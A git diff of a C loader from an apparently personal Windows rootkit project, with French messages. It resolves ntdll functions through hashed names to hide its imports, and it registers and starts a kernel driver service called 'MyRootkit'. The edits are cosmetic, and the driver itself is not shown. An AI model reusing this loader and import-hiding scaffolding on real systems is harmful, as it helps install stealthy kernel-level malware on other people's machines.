@@ -62,7 +62,8 @@ PVOID SelfGetProcAddress(HMODULE module, uint8_t name[16]) {
     }
     return NULL;
 }
-/*https://res.cloudinary.com/practicaldev/image/fetch/s--sMtYPRHi--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/ahb7ncw4rop0ogid77t2.png
+/*
+https://res.cloudinary.com/practicaldev/image/fetch/s--sMtYPRHi--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/ahb7ncw4rop0ogid77t2.png
 */
 
 int main() {
@@ -70,6 +71,7 @@ int main() {
     uint8_t ntdllHash[16] = { 0xa3,0xcb,0x33,0x79,0xad,0x0c,0xf1,0x93,0xfa,0xe7,0x5c,0xa4,0x71,0x86,0xc0,0x02 };
 
     HMODULE ntdllBase = (HMODULE)SelfGetModuleHandle(ntdllHash);
+
     /*
     uint8_t kernelhash[16] = { 0x31,0x0f,0x76,0x5e,0xda,0xab,0x10,0x80,0xde,0x41,0xdc,0x38,0xdd,0x3a,0x06,0x02 };
     HMODULE kerneldllBase = (HMODULE)SelfGetModuleHandle(kernelhash);
@@ -118,7 +120,7 @@ int main() {
         return 1;
     }
 
-    service = CreateServiceW(scm, L"testrootkit1", L"testrootkit1", SERVICE_ALL_ACCESS, SERVICE_KERNEL_DRIVER, SERVICE_DEMAND_START, SERVICE_ERROR_NORMAL, L"C:\\ROOTKIT.SYS", NULL, NULL, NULL, NULL, NULL);
+    service = CreateServiceW(scm, L"MyRootkit", L"MyRootkit", SERVICE_ALL_ACCESS, SERVICE_KERNEL_DRIVER, SERVICE_DEMAND_START, SERVICE_ERROR_NORMAL, L"C:\\Users\\Prince2lu\\source\\repos\\MyRootkit\\x64\\Debug\\RootKitDriver.sys", NULL, NULL, NULL, NULL, NULL);
     if (!service) {
         printf("Impossible de charger le driver. Erreur %d\n", GetLastError());
         CloseServiceHandle(scm);
@@ -135,7 +137,7 @@ int main() {
     printf("Driver charge et demarre avec succes.\n");
     system("PAUSE");
     if (!ControlService(service, SERVICE_CONTROL_STOP, &status)) {
-        printf("Impossible d'arrêter le driver. Erreur %d\n", GetLastError());
+        printf("Impossible d'arreter le driver. Erreur %d\n", GetLastError());
     }
 
     if (!DeleteService(service)) {
